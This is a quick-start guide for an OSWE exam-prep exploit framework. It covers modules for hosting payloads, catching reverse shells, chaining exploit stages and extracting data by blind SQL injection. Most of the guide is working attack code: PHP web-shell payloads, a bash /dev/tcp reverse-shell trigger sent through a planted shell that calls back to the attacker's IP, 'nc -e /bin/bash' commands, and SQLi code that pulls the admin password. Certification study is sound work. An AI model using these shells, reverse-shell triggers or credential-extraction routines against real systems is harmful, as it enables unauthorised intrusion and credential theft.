# Quick Start Guide - OSWE Advanced Skeleton

**Get up and running in 5 minutes**

## Skeleton Selection

Choose the right skeleton for your exploit:

| Skeleton | Use Case | Features |
|----------|----------|----------|
| `poc_advanced.py` | Complex exploits | Full modules, stages, dependencies |
| `poc_simple.py` | Quick/simple exploits | Single file, no dependencies |
| `examples/step_based_example.py` | Linear exploits | Sequential steps using modules |

## Installation

```bash
cd /home/simon/code/OSWE-Prep/poc-examples/advanced-skeleton

# No dependencies required for basic usage
# Optional: For async SQLi
pip3 install aiohttp
```

## Quick Test

### 1. Test Individual Modules

```bash
# Test logger
python3 modules/logger.py

# Test payload server
python3 modules/payload_server.py
# In another terminal: curl http://localhost:8000/shell.php

# Test listener (will wait for connection)
python3 modules/listener.py
# In another terminal: nc -e /bin/bash 127.0.0.1 4444

# Test stage management
python3 modules/stages.py

# Test SQLi (requires vulnerable target)
# python3 modules/sqli.py
```

### 2. Run Example Exploitation

```bash
# Full exploitation example
python3 examples/example_full_exploitation.py --target-ip 192.168.1.100
```

### 3. Choose Your Skeleton

**Option A: Full-Featured (poc_advanced.py)**
```bash
# Copy and customize
cp poc_advanced.py my_exploit.py
vim my_exploit.py
# Modify stage functions
```

**Option B: Lightweight (poc_simple.py)**
```bash
# Single-file, no dependencies
cp poc_simple.py my_exploit.py
vim my_exploit.py
# Modify step1(), step2(), etc.
```

**Option C: Step-Based Pattern**
```bash
# Reference implementation
cp examples/step_based_example.py my_exploit.py
vim my_exploit.py
# See step-by-step example
```

## Module Usage Examples

### Logger

```python
from modules import create_logger

log = create_logger("test")
log.stage("Recon")
log.info("Scanning...")
log.success("Found SQLi!")
log.close()
```

**Output:**
```
==================================================
Stage 1: Recon
==================================================
[*] Scanning...
[+] Found SQLi!
```

**Log File:** `Logs/test_TIMESTAMP.log`

### Payload Server

```python
from modules import PayloadServer

server = PayloadServer(port=8000)
server.add_payload("/shell.php", "<?php system($_GET['c']); ?>")
server.start(blocking=False)

print(f"Shell: {server.get_url('/shell.php')}")
# Shell: http://192.168.1.5:8000/shell.php

# Later...
server.stop()
```

### Interactive Listener

```python
from modules import InteractiveListener

# Create listener
listener = InteractiveListener(port=4444)

# Start in background
listener.start(blocking=False)
print(f"Listener on port 4444")

# Trigger reverse shell on target...

# Wait for connection
if listener.wait_for_connection(timeout=60):
    print("Got shell!")
    listener.interactive_shell()  # Interactive mode

# Cleanup
listener.stop()
```

### Stage Manager

```python
from modules import StageManager

manager = StageManager()

@manager.stage("Stage 1")
def stage1(ctx):
    print("Executing stage 1")
    return True

@manager.stage("Stage 2", depends_on=["Stage 1"])
def stage2(ctx):
    print("Executing stage 2")
    return True

manager.execute(None)
```

### Blind SQLi

```python
from modules import BlindSQLi, MySQLDialect

sqli = BlindSQLi(
    url="http://target/vuln.php?id=1",
    dialect=MySQLDialect(),
    delay=2
)

# Extract with binary search (fast!)
password = sqli.extract("SELECT password FROM users LIMIT 1")
print(f"Password: {password}")
```

### Liveness Check

```python
# In your exploit, add at the beginning:
from poc_advanced import liveness_check

if not liveness_check(ctx):
    ctx.logger.error("Target unreachable")
    sys.exit(1)

# Or in poc_simple.py:
def liveness_check():
    try:
        response = session.get(target_url, timeout=10)
        return response.status_code == 200
    except:
        return False
```

## Common Customizations

### 1. Add Custom Stage

```python
def stage_my_exploit(ctx: ExploitContext, manager: StageManager) -> bool:
    """My custom exploitation logic."""
    ctx.logger.info("Exploiting vulnerability...")

    # Your code here
    exploit_url = f"{ctx.get_base_url()}/vuln"
    response = ctx.session.get(exploit_url)

    if "success" in response.text:
        ctx.logger.success("Exploitation successful!")
        return True
    else:
        ctx.logger.error("Exploitation failed")
        return False

# In main():
manager.add_stage("My Exploit", stage_my_exploit, depends_on=["Authentication"])
```

### 2. Use Blind SQLi

```python
def stage_sqli(ctx: ExploitContext, manager: StageManager) -> bool:
    """Extract data via blind SQLi."""

    sqli = BlindSQLi(
        url=f"{ctx.get_base_url()}/search",
        dialect=PostgreSQLDialect(),
        delay=ctx.delay,
        param_name="q",
        injection_point="test{payload}",
        logger=ctx.logger
    )

    # Extract admin password
    password = sqli.extract(
        "SELECT password FROM users WHERE username='admin'",
        use_binary=True
    )

    ctx.logger.credential("admin", password, "SQLi")
    ctx.password = password

    return True
```

### 3. Host Payload

```python
def stage_payload_server(ctx: ExploitContext, manager: StageManager) -> bool:
    """Setup payload server."""

    server = PayloadServer(port=ctx.payload_port, verbose=False)

    # Add shell
    shell = "<?php system($_REQUEST['cmd']); ?>"
    server.add_payload("/shell.php", shell)

    # Add callback
    def callback(req):
        ctx.logger.success(f"Callback from {req['client']}")

    server.add_callback_handler("/callback", callback)

    server.start(blocking=False)
    ctx.payload_server = server

    ctx.logger.success(f"Server: {server.get_url()}")

    return True
```

### 4. Capture Reverse Shell

```python
def stage_reverse_shell(ctx: ExploitContext, manager: StageManager) -> bool:
    """Capture and interact with reverse shell."""

    # Start listener
    ctx.listener = InteractiveListener(port=ctx.attacker_port)
    ctx.listener.start(blocking=False)

    ctx.logger.info("Triggering reverse shell on target...")

    # Trigger shell via exploit
    trigger_url = f"{ctx.shell_url}?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{ctx.attacker_ip}/{ctx.attacker_port}+0>%261'"
    ctx.session.get(trigger_url, timeout=2)

    # Wait and capture
    if ctx.listener.wait_for_connection(timeout=60):
        ctx.logger.success("Shell connected!")
        ctx.listener.interactive_shell()
        return True
    else:
        ctx.logger.error("No connection")
        return False
```

## Skeleton Selection Guide

### When to Use Each Skeleton

**`poc_advanced.py`** - Use for:
- Multi-stage exploits with dependencies
- Complex vulnerability chains
- When you need retry logic
- Blind SQLi extraction
- Multiple verification methods
- Professional audit trail required

**`poc_simple.py`** - Use for:
- Single vulnerability exploits
- Quick proof-of-concepts
- When portability is important
- Standalone scripts (no module dependencies)
- Learning/experimenting

**`examples/step_based_example.py`** - Use for:
- Linear exploit flows
- When stages feel like overkill
- Educational examples
- Reference for using modules with step pattern

## Directory Layout for OSWE Exam

For each exam machine, create:

```
target1/
├── poc.py              # Main exploit (choose your skeleton)
├── poc_simple.py       # Optional: backup quick exploit
├── modules/            # Copy entire modules/ directory
│   ├── __init__.py
│   ├── logger.py
│   ├── payload_server.py
│   ├── listener.py
│   ├── stages.py
│   └── sqli.py
├── Notes.md            # Manual notes
├── Archives/           # Saved responses, tokens
├── Logs/               # Auto-generated logs
└── Screenshots/        # Exam evidence
```

### Skeleton Decision Flow

```
Starting a new target?
│
├─ Complex multi-step exploit?
│  ├─ Need dependencies/stages?
│  │  └─► Use poc_advanced.py
│  │
│  └─ Linear sequential flow?
│     └─► Use examples/step_based_example.py
│
├─ Simple single vulnerability?
│  └─► Use poc_simple.py
│
└─ Need maximum portability?
   └─► Use poc_simple.py (single file)
```

## Testing Workflow

### 1. Test Connectivity

```bash
python3 poc_advanced.py --target-ip TARGET --help

python3 poc_advanced.py --target-ip TARGET \
    --verbose 2>&1 | tee test.log
```

### 2. Use Burp for Debugging

```bash
# Terminal 1: Start Burp on 127.0.0.1:8080

# Terminal 2: Run exploit with proxy
python3 poc_advanced.py --target-ip TARGET \
    --proxy http://127.0.0.1:8080 \
    --verbose
```

### 3. Iterate on Stages

```python
# Comment out later stages while testing early ones
# manager.add_stage("Recon", stage_recon)
# manager.add_stage("Auth", stage_auth)
# manager.add_stage("Exploit", stage_exploit)  # Test up to here
# # manager.add_stage("Verify", stage_verify)  # Skip for now
```

### 4. Check Logs

```bash
# Logs are automatically saved
ls -lt Logs/

# View latest log
tail -f Logs/advanced_poc_*.log
```

## Common Issues

### Port Already in Use

```bash
# Change payload server port
python3 poc.py --target-ip TARGET --payload-port 8001
```

### SQLi Too Slow

```python
# Reduce delay
sqli = BlindSQLi(url=url, delay=1)  # Default is 3

# Or use async (much faster)
import asyncio
result = asyncio.run(sqli.extract_async(query))
```

### Module Import Errors

```bash
# Make sure you're in the right directory
cd /path/to/advanced-skeleton/

# Or adjust Python path
export PYTHONPATH="${PYTHONPATH}:/path/to/advanced-skeleton"
```

### Stage Dependencies Not Met

```python
# Make stages optional if they're not critical
manager.add_stage("Optional Step", func, optional=True)
```

## Next Steps

1. ✅ Read full documentation: `README.md`
2. ✅ Study module source code in `modules/`
3. ✅ Run example: `examples/example_full_exploitation.py`
4. ✅ Customize `poc_advanced.py` for your target
5. ✅ Practice with vulnerable VMs

## Complete Examples

### Example 1: Full Exploitation Chain (poc_advanced.py)

```bash
# Stage-based exploitation with all features
python3 poc_advanced.py \
  --target-ip 192.168.1.10 \
  --target-port 80 \
  --listening-ip 10.10.14.5 \
  --listening-port 4444 \
  --username admin \
  --password secret \
  --proxy http://127.0.0.1:8080 \
  --verbose
```

### Example 2: Quick Exploit (poc_simple.py)

```bash
# Single-file, no dependencies
python3 poc_simple.py \
  --target-ip 192.168.1.10 \
  --lhost 10.10.14.5 \
  --lport 4444 \
  --proxy http://127.0.0.1:8080
```

### Example 3: Step-Based Pattern

```bash
# Sequential step execution
python3 examples/step_based_example.py \
  --target-ip 192.168.1.10 \
  --listening-ip 10.10.14.5 \
  --username admin \
  --password secret
```

### Example 4: Listener Only Test

```bash
# Test listener functionality
python3 -c "
from modules import InteractiveListener
import time

listener = InteractiveListener(port=4444)
listener.start(blocking=False)
print('Listener started on 4444')
print('Run: nc -e /bin/bash 127.0.0.1 4444')

if listener.wait_for_connection(timeout=30):
    print('Got connection!')
    listener.interactive_shell()

listener.stop()
"
```

## Resources

- **Full README**: `README.md`
- **Module Docs**: `modules/*.py` (well-commented)
- **Examples**: `examples/`
- **Main Guide**: `../OSWE-PoC-Skeleton-Guide.md`
- **Reference Repo**: https://github.com/dark-warlord14/oswe-exploit-kit (core logic integrated)

---

**Ready to exploit? Choose your skeleton and start hacking! 🎯**

- Complex exploit? → `poc_advanced.py`
- Quick & simple? → `poc_simple.py`  
- Learning steps? → `examples/step_based_example.py`
